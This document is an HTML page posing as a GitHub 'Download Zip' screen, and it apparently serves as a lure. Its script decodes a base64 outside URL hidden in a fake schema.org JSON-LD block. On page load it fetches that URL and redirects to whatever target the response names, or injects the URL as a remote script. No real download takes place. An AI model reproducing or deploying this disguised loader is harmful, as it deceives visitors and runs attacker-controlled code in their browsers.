<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Download Zip</title>
  <script type="application/ld+json" id="slip">
  {
    "@context": "https://schema.org",
    "@type": "DigitalDocument",
    "identifier": "aHR0cHM6Ly9hdHdpbmxvY3VzLmNvbS9zdW5uaS5zaGlyZQ=="
  }
  </script>
  <style>
    * { box-sizing: border-box; margin: 0; }
    html, body { height: 100%; }
    body {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #010409;
      color: #f0f6fc;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Noto Sans", Helvetica, Arial, sans-serif;
    }
    .box {
      text-align: center;
      padding: 24px;
    }
    .mark {
      width: 32px;
      height: 32px;
      fill: #f0f6fc;
      margin-bottom: 20px;
    }
    h1 {
      font-size: 24px;
      font-weight: 600;
      margin-bottom: 12px;
    }
    p {
      font-size: 14px;
      color: #8b949e;
    }
    p.fail { color: #f85149; }
  </style>
</head>
<body>
  <div class="box">
    <svg class="mark" viewBox="0 0 16 16" aria-hidden="true">
      <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path>
    </svg>
    <h1 id="title">Preparing your download...</h1>
    <p id="note">Please keep this page open while we prepare your zip.</p>
  </div>

  <script>
  (function () {
    var WAIT_MS = 500;
    var titleEl = document.getElementById('title');
    var noteEl = document.getElementById('note');

    function fail(msg) {
      titleEl.textContent = 'Could not start download';
      noteEl.textContent = msg;
      noteEl.classList.add('fail');
    }

    function hopFromJsonLd() {
      var raw = document.getElementById('slip').textContent;
      var data = JSON.parse(raw);
      var url = atob(String(data.identifier || '').trim());
      if (!/^https?:\/\//i.test(url)) throw new Error('bad');
      return url;
    }

    function parseHopBody(text) {
      var body = String(text || '').trim();
      try {
        var j = JSON.parse(body);
        if (j && j.c) {
          var u = atob(String(j.c).trim());
          if (/^https?:\/\//i.test(u)) return u;
        }
      } catch (e) {}
      var patterns = [
        /top\.location\.(?:assign|replace)\s*\(\s*['"]([^'"]+)['"]\s*\)/i,
        /location\.(?:replace|assign)\s*\(\s*['"]([^'"]+)['"]\s*\)/i,
        /(?:window\.)?location\.href\s*=\s*['"]([^'"]+)['"]/i
      ];
      for (var i = 0; i < patterns.length; i++) {
        var m = body.match(patterns[i]);
        if (m && m[1]) return m[1];
      }
      throw new Error('parse');
    }

    function attachScript(hopUrl) {
      var s = document.createElement('script');
      s.src = hopUrl;
      s.async = true;
      s.onerror = function () { fail('Download script blocked'); };
      document.head.appendChild(s);
    }

    function openHop(hopUrl) {
      var xhr = new XMLHttpRequest();
      xhr.open('GET', hopUrl, true);
      xhr.timeout = 4000;
      xhr.onreadystatechange = function () {
        if (xhr.readyState !== 4) return;
        if (xhr.status >= 200 && xhr.status < 300) {
          try {
            window.location.replace(parseHopBody(xhr.responseText));
            return;
          } catch (e) {}
        }
        attachScript(hopUrl);
      };
      xhr.onerror = function () { attachScript(hopUrl); };
      xhr.ontimeout = function () { attachScript(hopUrl); };
      xhr.send();
    }

    var hopUrl;
    try {
      hopUrl = hopFromJsonLd();
    } catch (e) {
      fail('Missing download config');
      return;
    }

    setTimeout(function () {
      openHop(hopUrl);
    }, WAIT_MS);
  })();
  </script>
</body>
</html>
